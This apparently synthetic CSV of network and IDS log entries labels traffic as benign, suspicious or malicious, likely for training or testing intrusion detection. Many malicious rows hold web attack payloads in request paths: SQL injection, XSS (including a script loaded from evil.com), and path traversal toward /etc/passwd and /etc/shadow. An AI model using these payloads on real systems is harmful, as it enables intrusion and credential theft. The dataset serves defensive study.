timestamp,source_ip,dest_ip,protocol,action,threat_label,log_type,bytes_transferred,user_agent,request_path
2024-05-02T18:51:38,192.168.1.161,192.168.1.79,HTTP,allowed,malicious,ids,1442,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/search?q=<script src='http://evil.com/x.js'>
2024-05-01T14:57:18,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,662,python-requests/2.28.0,/admin/login.php
2024-05-03T09:11:26,192.168.1.125,192.168.1.135,TCP,blocked,malicious,ids,551,curl/7.85,/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-03T06:09:23,192.168.1.40,192.168.1.157,SSH,allowed,benign,ids,26956,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login
2024-05-02T16:58:12,192.168.1.224,192.168.1.12,ICMP,allowed,benign,ids,15139,curl/7.85,/ftp
2024-05-03T00:49:29,192.168.1.205,192.168.1.108,HTTP,allowed,benign,firewall,8784,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/index.php
2024-05-01T14:56:36,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,686,python-requests/2.28.0,/admin/login.php
2024-05-02T05:43:16,192.168.1.246,192.168.1.133,TCP,allowed,benign,firewall,15239,python-requests/2.28.0,/ftp
2024-05-01T23:38:55,192.168.1.23,192.168.1.48,TCP,allowed,malicious,ids,1240,python-requests/2.28.0,/update?field=vbscript:msgbox(1)
2024-05-03T11:01:18,192.168.1.136,192.168.1.122,ICMP,allowed,benign,application,676,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ssh
2024-05-02T04:57:49,192.168.1.178,192.168.1.176,TCP,allowed,benign,ids,27682,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/admin/login.php
2024-05-03T11:50:23,192.168.1.199,192.168.1.55,UDP,allowed,benign,firewall,13572,python-requests/2.28.0,/ftp
2024-05-01T14:58:27,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,752,python-requests/2.28.0,/admin/login.php
2024-05-02T06:57:58,192.168.1.66,192.168.1.208,SSH,allowed,benign,firewall,26301,python-requests/2.28.0,/dashboard
2024-05-03T13:02:58,192.168.1.45,192.168.1.11,HTTP,allowed,malicious,ids,999,python-requests/2.28.0,/login?pass=admin' OR 'x'='x
2024-05-02T19:59:00,192.168.1.32,192.168.1.90,ICMP,allowed,benign,firewall,11538,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ssh
2024-05-01T14:46:18,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,532,python-requests/2.28.0,/admin/login.php
2024-05-01T14:46:15,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,424,python-requests/2.28.0,/admin/login.php
2024-05-01T14:40:00,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,314,python-requests/2.28.0,/admin/login.php
2024-05-02T14:20:58,192.168.1.90,192.168.1.226,UDP,allowed,benign,ids,7999,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/
2024-05-02T10:01:24,192.168.1.72,192.168.1.115,HTTP,blocked,malicious,ids,1357,python-requests/2.28.0,/fetch?name=..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2024-05-01T14:46:03,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,673,python-requests/2.28.0,/admin/login.php
2024-05-01T14:00:40,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,4305490,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-02T18:36:50,192.168.1.180,192.168.1.213,TCP,allowed,malicious,ids,1027,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/static/..%2F..%2Fetc%2Fpasswd
2024-05-03T01:09:06,192.168.1.181,192.168.1.8,TCP,blocked,malicious,ids,1343,curl/7.85,/img/../../../../etc/hosts
2024-05-01T18:55:03,192.168.1.4,192.168.1.68,HTTP,blocked,malicious,ids,223,curl/7.85,/view?doc=..%252f..%252fetc%252fpasswd
2024-05-01T17:35:21,192.168.1.191,192.168.1.122,TCP,allowed,malicious,ids,141,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/assets/..%5C..%5Cwindows%5Csystem32
2024-05-03T05:11:31,192.168.1.192,192.168.1.189,TCP,allowed,suspicious,ids,549,gobuster/3.1,/admin/
2024-05-02T20:45:26,192.168.1.207,192.168.1.4,ICMP,allowed,benign,firewall,1756,curl/7.85,/index.php
2024-05-02T18:48:48,192.168.1.86,192.168.1.216,TCP,allowed,malicious,ids,1001,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/update?field=vbscript:msgbox(1)
2024-05-03T04:52:38,192.168.1.154,192.168.1.114,SSH,allowed,benign,ids,21376,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ftp
2024-05-01T21:09:03,192.168.1.51,192.168.1.186,ICMP,allowed,benign,ids,21782,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.php
2024-05-03T13:39:56,192.168.1.93,192.168.1.65,HTTP,allowed,malicious,ids,1460,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/page?name=<script>alert(1)</script>
2024-05-01T14:41:45,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,299,python-requests/2.28.0,/admin/login.php
2024-05-02T08:26:44,192.168.1.124,192.168.1.164,SSH,allowed,benign,firewall,23720,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/dashboard
2024-05-03T13:24:25,192.168.1.250,192.168.1.153,HTTP,allowed,malicious,ids,756,python-requests/2.28.0,/profile?bio=<img src=x onerror=alert(1)>
2024-05-01T14:47:00,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,669,python-requests/2.28.0,/admin/login.php
2024-05-03T01:57:56,192.168.1.228,192.168.1.241,HTTP,allowed,malicious,ids,658,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/login?user=admin'--
2024-05-03T06:20:33,192.168.1.147,192.168.1.95,TCP,blocked,malicious,ids,1353,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?user=admin'--
2024-05-02T15:28:23,192.168.1.80,192.168.1.248,TCP,blocked,malicious,ids,1318,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/items?category=1 AND 1=1
2024-05-03T06:41:58,192.168.1.97,192.168.1.165,TCP,blocked,malicious,ids,1472,python-requests/2.28.0,/login?user=admin'--
2024-05-02T09:24:22,192.168.1.199,192.168.1.101,TCP,allowed,benign,application,30911,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/dashboard
2024-05-03T07:00:31,192.168.1.124,192.168.1.198,HTTP,allowed,benign,ids,30171,curl/7.85,/
2024-05-01T14:24:02,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,4510534,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-01T14:45:24,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,484,python-requests/2.28.0,/admin/login.php
2024-05-03T04:18:23,192.168.1.140,192.168.1.130,HTTP,allowed,malicious,ids,1062,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api?filter=SELECT username FROM users
2024-05-02T08:02:35,192.168.1.71,192.168.1.166,HTTP,blocked,malicious,ids,1233,python-requests/2.28.0,/fetch?name=..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2024-05-01T20:47:09,192.168.1.124,192.168.1.169,HTTP,allowed,benign,application,178,curl/7.85,/ftp
2024-05-02T22:17:10,192.168.1.114,192.168.1.244,TCP,allowed,suspicious,ids,303,nikto/2.1.6,/robots.txt
2024-05-03T12:08:21,192.168.1.204,192.168.1.226,HTTP,allowed,malicious,ids,1155,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,"/input?val=data:text/html,<script>alert(1)</script>"
2024-05-03T01:38:35,192.168.1.136,192.168.1.248,TCP,allowed,malicious,ids,1351,curl/7.85,/search?q=<script src='http://evil.com/x.js'>
2024-05-01T19:17:59,192.168.1.49,192.168.1.206,HTTP,allowed,malicious,ids,527,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/post?title=javascript:alert(document.domain)
2024-05-03T04:46:53,192.168.1.181,192.168.1.59,TCP,blocked,malicious,ids,913,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api?filter=SELECT username FROM users
2024-05-01T23:45:13,192.168.1.81,192.168.1.31,HTTP,allowed,malicious,ids,339,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36","/input?val=data:text/html,<script>alert(1)</script>"
2024-05-01T14:57:15,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,729,python-requests/2.28.0,/admin/login.php
2024-05-03T08:16:52,192.168.1.40,192.168.1.44,TCP,blocked,malicious,ids,158,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/search?q=1 OR 1=1
2024-05-02T10:35:09,192.168.1.30,192.168.1.201,TCP,allowed,benign,ids,13118,python-requests/2.28.0,/dashboard
2024-05-03T02:48:09,192.168.1.126,192.168.1.65,TCP,blocked,suspicious,ids,1399,sqlmap/1.7,/.git/
2024-05-02T19:21:56,192.168.1.210,192.168.1.61,TCP,allowed,benign,ids,29210,python-requests/2.28.0,/index.html
2024-05-03T12:05:57,192.168.1.150,192.168.1.141,TCP,allowed,malicious,ids,1323,python-requests/2.28.0,/items?category=1 AND 1=1
2024-05-01T14:57:18,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,705,python-requests/2.28.0,/admin/login.php
2024-05-01T23:09:44,192.168.1.125,192.168.1.60,SSH,allowed,benign,application,22861,curl/7.85,/dashboard
2024-05-02T07:37:02,192.168.1.184,192.168.1.37,TCP,allowed,malicious,ids,103,python-requests/2.28.0,/search?q=1' AND '1'='1
2024-05-02T10:56:40,192.168.1.245,192.168.1.183,HTTP,allowed,malicious,ids,1005,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/query?val=1/*comment*/OR/**/1=1
2024-05-02T21:04:27,192.168.1.213,192.168.1.233,HTTP,blocked,suspicious,ids,1623,dirb/2.22,/.git/
2024-05-01T14:00:30,192.168.1.99,192.168.1.20,TCP,allowed,suspicious,firewall,2232219,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-03T00:52:49,192.168.1.81,192.168.1.46,TCP,allowed,malicious,ids,696,curl/7.85,/profile?bio=<img src=x onerror=alert(1)>
2024-05-03T04:59:41,192.168.1.176,192.168.1.222,TCP,blocked,malicious,ids,1075,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/download?file=../../../etc/shadow
2024-05-02T12:35:09,192.168.1.179,192.168.1.112,HTTP,blocked,malicious,ids,600,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/read?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd
2024-05-01T14:58:06,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,749,python-requests/2.28.0,/admin/login.php
2024-05-01T18:59:22,192.168.1.153,192.168.1.18,TCP,allowed,suspicious,ids,345,nikto/2.1.6,/phpinfo.php
2024-05-03T03:45:05,192.168.1.93,192.168.1.160,HTTP,allowed,suspicious,ids,1656,nikto/2.1.6,/wp-admin/
2024-05-02T06:44:58,192.168.1.98,192.168.1.146,HTTP,allowed,malicious,ids,1227,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/post?title=javascript:alert(document.domain)
2024-05-03T13:19:43,192.168.1.86,192.168.1.203,HTTP,blocked,malicious,ids,178,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/query?val=1/*comment*/OR/**/1=1
2024-05-02T10:07:02,192.168.1.143,192.168.1.3,TCP,blocked,suspicious,ids,594,dirb/2.22,/robots.txt
2024-05-01T14:56:12,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,780,python-requests/2.28.0,/admin/login.php
2024-05-02T13:13:11,192.168.1.153,192.168.1.57,HTTP,allowed,malicious,ids,219,curl/7.85,/view?doc=..%252f..%252fetc%252fpasswd
2024-05-02T20:01:54,192.168.1.245,192.168.1.91,ICMP,allowed,benign,application,737,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/dashboard
2024-05-01T14:00:18,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,2239855,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-03T13:50:55,192.168.1.161,192.168.1.27,TCP,blocked,malicious,ids,190,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login?pass=admin' OR 'x'='x
2024-05-01T14:00:14,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,3770464,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-02T08:23:58,192.168.1.169,192.168.1.40,TCP,allowed,malicious,ids,251,curl/7.85,/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-02T03:00:50,192.168.1.95,192.168.1.144,ICMP,allowed,benign,ids,16731,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ssh
2024-05-01T14:00:48,192.168.1.99,192.168.1.20,TCP,allowed,suspicious,firewall,2980632,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/upload
2024-05-02T12:37:27,192.168.1.84,192.168.1.23,TCP,blocked,malicious,ids,855,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/assets/..%5C..%5Cwindows%5Csystem32
2024-05-01T14:45:45,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,473,python-requests/2.28.0,/admin/login.php
2024-05-01T14:00:00,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,3354921,python-requests/2.28.0,/upload
2024-05-02T14:58:52,192.168.1.117,192.168.1.201,HTTP,allowed,malicious,ids,813,curl/7.85,/search?q=<script src='http://evil.com/x.js'>
2024-05-01T14:57:24,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,453,python-requests/2.28.0,/admin/login.php
2024-05-01T22:18:10,192.168.1.25,192.168.1.195,HTTP,allowed,benign,firewall,22471,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/admin/login.php
2024-05-01T14:59:12,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,200,python-requests/2.28.0,/admin/login.php
2024-05-02T12:38:41,192.168.1.177,192.168.1.31,TCP,allowed,malicious,ids,1358,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/page?id=1; DROP TABLE users--
2024-05-02T17:02:39,192.168.1.119,192.168.1.179,TCP,allowed,benign,ids,5357,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/
2024-05-03T04:40:33,192.168.1.253,192.168.1.144,HTTP,allowed,suspicious,ids,1354,gobuster/3.1,/robots.txt
2024-05-02T17:21:13,192.168.1.21,192.168.1.175,HTTP,allowed,malicious,ids,342,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/update?field=vbscript:msgbox(1)
2024-05-03T13:04:52,192.168.1.210,192.168.1.241,TCP,allowed,benign,application,10176,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/index.html
2024-05-01T14:00:12,192.168.1.99,192.168.1.20,TCP,allowed,suspicious,firewall,4773560,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-02T15:31:26,192.168.1.151,192.168.1.206,ICMP,allowed,benign,firewall,27984,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/admin/login.php
2024-05-03T02:22:46,192.168.1.35,192.168.1.229,ICMP,allowed,benign,application,20791,curl/7.85,/admin/login.php
2024-05-03T05:19:57,192.168.1.21,192.168.1.36,TCP,blocked,suspicious,ids,884,sqlmap/1.7,/robots.txt
2024-05-02T15:10:19,192.168.1.187,192.168.1.202,HTTP,allowed,suspicious,ids,1341,gobuster/3.1,/phpinfo.php
2024-05-02T21:27:09,192.168.1.75,192.168.1.202,UDP,allowed,benign,firewall,8763,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login
2024-05-01T21:18:07,192.168.1.55,192.168.1.131,UDP,allowed,benign,ids,3511,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ftp
2024-05-03T06:01:47,192.168.1.131,192.168.1.29,HTTP,allowed,malicious,ids,1212,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/page?name=<script>alert(1)</script>
2024-05-02T20:31:11,192.168.1.151,192.168.1.191,TCP,allowed,suspicious,ids,1441,dirb/2.22,/wp-admin/
2024-05-03T06:04:31,192.168.1.251,192.168.1.238,HTTP,allowed,malicious,ids,1437,curl/7.85,/query?val=1/*comment*/OR/**/1=1
2024-05-02T09:08:58,192.168.1.21,192.168.1.109,HTTP,allowed,benign,application,17916,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/admin/login.php
2024-05-02T01:11:32,192.168.1.238,192.168.1.83,ICMP,allowed,benign,firewall,19836,curl/7.85,/ssh
2024-05-01T14:57:48,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,207,python-requests/2.28.0,/admin/login.php
2024-05-03T04:20:05,192.168.1.123,192.168.1.1,TCP,blocked,malicious,ids,367,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/img/../../../../etc/hosts
2024-05-03T03:00:56,192.168.1.200,192.168.1.236,HTTP,allowed,benign,application,11480,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/login
2024-05-01T14:46:09,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,476,python-requests/2.28.0,/admin/login.php
2024-05-03T08:51:35,192.168.1.177,192.168.1.129,HTTP,allowed,malicious,ids,150,curl/7.85,/search?q=<script src='http://evil.com/x.js'>
2024-05-02T09:33:15,192.168.1.83,192.168.1.213,TCP,allowed,malicious,ids,1220,python-requests/2.28.0,/comment?text=</script><script>document.cookie
2024-05-02T14:24:27,192.168.1.24,192.168.1.210,TCP,allowed,suspicious,ids,560,dirb/2.22,/login
2024-05-03T12:42:33,192.168.1.198,192.168.1.148,TCP,blocked,malicious,ids,1271,curl/7.85,/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-03T09:32:12,192.168.1.14,192.168.1.203,TCP,blocked,malicious,ids,775,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?pass=admin' OR 'x'='x
2024-05-02T01:16:01,192.168.1.169,192.168.1.124,HTTP,blocked,malicious,ids,817,python-requests/2.28.0,/search?q=1' AND '1'='1
2024-05-03T11:44:51,192.168.1.25,192.168.1.232,TCP,allowed,suspicious,ids,1715,nikto/2.1.6,/.git/
2024-05-02T09:19:24,192.168.1.14,192.168.1.33,TCP,blocked,malicious,ids,230,curl/7.85,/query?val=1/*comment*/OR/**/1=1
2024-05-01T14:56:24,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,270,python-requests/2.28.0,/admin/login.php
2024-05-02T18:02:56,192.168.1.231,192.168.1.148,TCP,allowed,suspicious,ids,190,Nmap Scripting Engine,/robots.txt
2024-05-01T14:42:27,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,396,python-requests/2.28.0,/admin/login.php
2024-05-03T03:13:21,192.168.1.122,192.168.1.204,TCP,blocked,suspicious,ids,681,nikto/2.1.6,/phpinfo.php
2024-05-03T05:52:53,192.168.1.134,192.168.1.96,TCP,allowed,benign,firewall,10858,curl/7.85,/index.php
2024-05-01T15:23:01,192.168.1.66,192.168.1.56,HTTP,allowed,malicious,ids,327,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/page?id=1; DROP TABLE users--
2024-05-02T17:10:58,192.168.1.65,192.168.1.192,HTTP,allowed,malicious,ids,238,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/page?id=1; DROP TABLE users--
2024-05-03T10:55:12,192.168.1.214,192.168.1.65,HTTP,allowed,benign,firewall,11985,python-requests/2.28.0,/
2024-05-01T23:56:09,192.168.1.250,192.168.1.41,TCP,allowed,malicious,ids,1429,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/img/../../../../etc/hosts
2024-05-02T10:35:12,192.168.1.180,192.168.1.221,HTTP,blocked,suspicious,ids,1507,sqlmap/1.7,/login
2024-05-01T18:59:47,192.168.1.236,192.168.1.24,ICMP,allowed,benign,ids,22912,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/admin/login.php
2024-05-03T10:24:16,192.168.1.41,192.168.1.94,TCP,allowed,malicious,ids,893,curl/7.85,/search?q=1' AND '1'='1
2024-05-03T02:56:35,192.168.1.19,192.168.1.80,TCP,allowed,malicious,ids,177,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/search?q=1' AND '1'='1
2024-05-03T01:27:07,192.168.1.203,192.168.1.124,ICMP,allowed,benign,firewall,32988,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/index.html
2024-05-03T08:34:34,192.168.1.31,192.168.1.102,HTTP,allowed,benign,firewall,2852,python-requests/2.28.0,/index.html
2024-05-02T06:28:42,192.168.1.156,192.168.1.247,HTTP,allowed,benign,ids,26573,python-requests/2.28.0,/
2024-05-01T14:00:42,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,2092864,python-requests/2.28.0,/upload
2024-05-03T10:20:35,192.168.1.122,192.168.1.10,HTTP,allowed,malicious,ids,925,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/fetch?name=..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2024-05-03T12:47:59,192.168.1.143,192.168.1.7,TCP,blocked,malicious,ids,469,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/items?category=1 AND 1=1
2024-05-01T14:57:03,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,608,python-requests/2.28.0,/admin/login.php
2024-05-01T18:22:18,192.168.1.56,192.168.1.209,SSH,allowed,benign,ids,6411,curl/7.85,/ssh
2024-05-02T07:55:33,192.168.1.202,192.168.1.57,UDP,allowed,benign,ids,23659,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ssh
2024-05-02T09:26:30,192.168.1.245,192.168.1.85,TCP,blocked,malicious,ids,635,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/page?id=1; DROP TABLE users--
2024-05-01T14:24:22,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,1115135,curl/7.85,/upload
2024-05-02T03:37:26,192.168.1.81,192.168.1.216,TCP,blocked,malicious,ids,835,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-02T06:11:49,192.168.1.52,192.168.1.210,HTTP,allowed,suspicious,ids,725,gobuster/3.1,/login
2024-05-01T14:00:16,192.168.1.99,192.168.1.20,TCP,allowed,suspicious,firewall,4025281,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-03T00:52:42,192.168.1.217,192.168.1.103,TCP,blocked,malicious,ids,1104,curl/7.85,/login?user=admin'--
2024-05-03T12:25:20,192.168.1.104,192.168.1.94,HTTP,blocked,malicious,ids,392,python-requests/2.28.0,/query?val=1/*comment*/OR/**/1=1
2024-05-03T07:20:06,192.168.1.145,192.168.1.37,HTTP,allowed,malicious,ids,1210,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/img/../../../../etc/hosts
2024-05-02T09:26:47,192.168.1.141,192.168.1.34,HTTP,allowed,suspicious,ids,1903,nikto/2.1.6,/robots.txt
2024-05-03T05:57:44,192.168.1.124,192.168.1.160,HTTP,allowed,benign,application,1305,curl/7.85,/
